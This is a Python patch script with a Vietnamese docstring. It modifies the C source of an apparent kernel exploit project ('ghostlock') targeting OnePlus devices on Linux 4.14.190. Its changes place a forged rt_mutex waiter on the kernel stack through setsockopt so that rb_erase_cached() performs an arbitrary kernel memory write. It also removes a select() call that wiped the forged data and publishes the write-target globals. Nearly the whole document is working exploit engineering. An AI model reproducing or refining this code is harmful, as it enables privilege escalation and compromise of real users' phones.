#!/usr/bin/env python3
"""patch_ssopt_paint.py

Sơn ĐỦ 8 word của dangling waiter trong route setsockopt (mode 4 / fops redirect).

Cơ sở (đã đối chiếu Image + source máy 4.14.190 + rtmutex.c):
  buf = SP0-0x1c0 ; waiter = SP0-0x1b0 = buf+0x10 ; optlen = 0x60 -> copy buộc
  phủ waiter+0x00..waiter+0x4f (đủ cả tree_entry, task, lock, prio, deadline).

  Derivation của lần ghi (rb_erase_cached, case 1 vì rb_left == 0):
      child = node->rb_right            (== TARGET address)
      pc    = node->__rb_parent_color   (== VALUE cần ghi)
      ... __rb_change_child(node, child, parent=pc&~3, root)
      if (child) child->__rb_parent_color = pc;   //  *TARGET = VALUE
                 rebalance = NULL;                  // child != 0 -> không color-fixup
  => tree_entry = (pc, rb_right, rb_left) = (VALUE, TARGET, 0).
  Bộ ba này chính là (write_pc, write_right, write_left) mà prepare_skb_payload()
  đang đặt cho pi_tree của W0 trong trang giả -> sơn cùng giá trị lên stack waiter
  là nhất quán với thiết kế.

  Bỏ select(192): res_out/res_ex = SP0-0x1b0..SP0-0x180 = waiter+0x00..0x2f, nó
  zero_fd_set() phá đúng tree_entry vừa sơn.  Giữ spin-park (kp27 đã chứng minh
  paint sống sót khi T không phát syscall nào).
"""
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"

s = open(F).read()

# ---------------------------------------------------------------- 1) default paint
old = """    } else {
      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                      : text_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
    }"""
new = """    } else if (ssopt_write_pc && ssopt_write_right && !ssopt_write_left) {
      /* Full waiter payload (waiter = SP0-0x1b0 = buf+0x10):
       *   buf[0x10] -> waiter+0x00  tree.parent_color = ssopt_write_pc (VALUE)
       *   buf[0x18] -> waiter+0x08  tree.rb_right     = ssopt_write_right (TARGET)
       *   buf[0x20] -> waiter+0x10  tree.rb_left      = 0
       *   buf[0x40] -> waiter+0x30  task              = fake_task/INIT_TASK
       *   buf[0x48] -> waiter+0x38  lock              = fake_lock
       *   buf[0x50] -> waiter+0x40  prio              = FAKE_WAITER_PRIO
       *   buf[0x58] -> waiter+0x48  deadline          = 0
       * Same triple that prepare_skb_payload() puts into W0's pi_tree, so
       * chain[7] rt_mutex_dequeue()/rb_erase_cached() itself performs the PI
       * write:  *(node->rb_right) = node->__rb_parent_color, i.e.
       * *(TARGET) = VALUE, with rebalance == NULL (rb_right != 0).  The
       * collateral parent->rb_right write lands in our page (parent =
       * VALUE & ~3, i.e. fake_fops+0x08 == fops->llseek; repaired later by
       * repair_fake_fops_llseek()).
       * prio MUST differ from task->prio, otherwise rt_mutex_adjust_pi() and
       * chain[3] take the rt_mutex_waiter_equal() early-out and NOTHING is
       * written (silent EINVAL-like failure).  FAKE_WAITER_PRIO (140) > the
       * exploit's normal prio (120) also keeps W on the left of fake_w0 in the
       * fake tree, so chain[11] sees waiter == rt_mutex_top_waiter(lock). */
      put64(buf, 0x10, ssopt_write_pc);
      put64(buf, 0x18, ssopt_write_right);
      put64(buf, 0x20, ssopt_write_left);
      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                      : text_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    } else {
      /* Fallback: no usable (value,target,0) triple -> keep tree_entry zeroed
       * so chain[7] rb_erase_cached() is harmless (case 1, parent NULL) and the
       * write has to come from chain[11] through the page's W0 pi_tree. */
      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                      : text_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    }"""
assert s.count(old) == 1, ("paint", s.count(old))
s = s.replace(old, new, 1)

# ---------------------------------------------------------------- 2) paint_len
old = """    socklen_t paint_len = (env_flag("SSOPT_RANGE", 0) || env_flag("SSOPT_SCAN", 0) ||
                            env_flag("SSOPT_SCAN2", 0))
                               ? 0x60 : 0x50;"""
new = """    /* Always copy the whole 0x60-byte buffer: buf[0x10..0x5f] is exactly
     * waiter+0x00..waiter+0x4f (tree_entry/task/lock/prio/deadline), and the
     * kernel caps the length itself with min(optlen, 0xfe). */
    socklen_t paint_len = 0x60;"""
assert s.count(old) == 1, ("len", s.count(old))
s = s.replace(old, new, 1)

# ---------------------------------------------------------------- 3) drop select(192)
old = """    /* Constructive fix (setsockopt + blocking select):
     *  - setsockopt already painted waiter->task (buf[0x40]) and waiter->lock
     *    (buf[0x48]); those are at SP0-0x180 / SP0-0x178 == bits words 18 / 19.
     *  - Now stay INSIDE the kernel so the syscall-exit path cannot clobber the
     *    paint, AND zero the dangling waiter's tree_entry/pi_tree.
     *  - select(192) -> core_sys_select(n=192) processes exactly
     *    FDS_LONGS(192)=3 longs/set * 6 sets = 18 stack words at
     *    bits = SP0-0x210 == words 0..17 == SP0-0x210..SP0-0x188.  Since
     *    waiter = SP0-0x1b0 = bits word 12, this zeroes waiter+0x00..0x2f
     *    (tree_entry@0x00 + pi_tree@0x18) while words 18/19 (task@0x30 /
     *    lock@0x38) are NOT processed -> the setsockopt paint survives. */
    {
      fd_set blk_in, blk_out, blk_ex;
      FD_ZERO(&blk_in); FD_ZERO(&blk_out); FD_ZERO(&blk_ex);
      struct timeval blk_tv = { .tv_sec = 0, .tv_usec = 300000 };
      select(192, &blk_in, &blk_out, &blk_ex, &blk_tv);
    }"""
new = """    /* Park in USERSPACE (no syscall) until the consumer has walked.  A second
     * syscall is NOT usable as a "hold" here: every deep syscall reuses this
     * region, and select(192) is the worst case -- its res_out/res_ex are
     * SP0-0x1b0..SP0-0x180 == waiter+0x00..0x2f, and zero_fd_set() wipes the
     * tree_entry/pi_tree we just painted.  The paint survives only because T
     * issues nothing between setsockopt and the consumer's sched_setattr(T). */"""
assert s.count(old) == 1, ("select", s.count(old))
s = s.replace(old, new, 1)

# ---------------------------------------------------------------- 4) header note
old = """ * NOTE: setsockopt does not block.  The consumer fires while this thread parks
 * in userspace (no further syscalls), so the kernel stack region stays intact."""
new = """ * PAYLOAD: the copy is 0x60 bytes, so buf[0x10..0x5f] is the dangling
 * waiter's first 0x50 bytes -- i.e. the complete rb_erase_cached() node:
 *   tree_entry = (pc, rb_right, rb_left) = (VALUE, TARGET, 0)  -> the PI write
 *   task = fake_task/INIT_TASK, lock = fake_lock, prio = FAKE_WAITER_PRIO
 * (the write is child->__rb_parent_color = pc, i.e. *(TARGET) = VALUE).
 *
 * NOTE: setsockopt does not block.  The consumer fires while this thread parks
 * in userspace (no further syscalls), so the kernel stack region stays intact."""
assert s.count(old) == 1, ("note", s.count(old))
s = s.replace(old, new, 1)

open(F, "w").write(s)
print("fops.c: ssopt route now paints the full 8-word waiter payload (len 0x60), select(192) dropped")

# ---------------------------------------------------------------- util.c + common.h
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

old = """uint64_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";"""
new = """uint64_t binwrite_target;
/* PI-write triple for the setsockopt route (mode 4): same (pc, right, left) that
 * prepare_skb_payload() puts into W0's pi_tree inside the fake page. */
uint64_t ssopt_write_pc;
uint64_t ssopt_write_right;
uint64_t ssopt_write_left;
char ashmem_path[256] = "/dev/ashmem";"""
assert u.count(old) == 1, ("util globals", u.count(old))
u = u.replace(old, new, 1)

old = """  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;"""
new = """  /* Publish the PI-write triple for do_setsockopt_fake_lock_route().
   * Usable only when rb_left == 0 (so rb_erase_cached() takes case 1) and both
   * the value and the target are non-NULL; otherwise the route keeps the
   * waiter's tree_entry zeroed and relies on chain[11] via W0's pi_tree. */
  if (write_left == 0 && write_pc != 0 && write_right != 0) {
    ssopt_write_pc = write_pc;
    ssopt_write_right = write_right;
    ssopt_write_left = write_left;
  } else {
    ssopt_write_pc = ssopt_write_right = ssopt_write_left = 0;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;"""
assert u.count(old) == 1, ("util publish", u.count(old))
u = u.replace(old, new, 1)
open(U, "w").write(u)
print("util.c: publish ssopt_write_pc/right/left from prepare_skb_payload()")

C = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
c = open(C).read()
old = "extern uint64_t binwrite_target;"
new = """extern uint64_t binwrite_target;
/* mode-4 PI-write triple for the setsockopt route (see prepare_skb_payload) */
extern uint64_t ssopt_write_pc;
extern uint64_t ssopt_write_right;
extern uint64_t ssopt_write_left;"""
assert c.count(old) == 1, ("common.h", c.count(old))
c = c.replace(old, new, 1)
open(C, "w").write(c)
print("common.h: extern ssopt_write_pc/right/left")
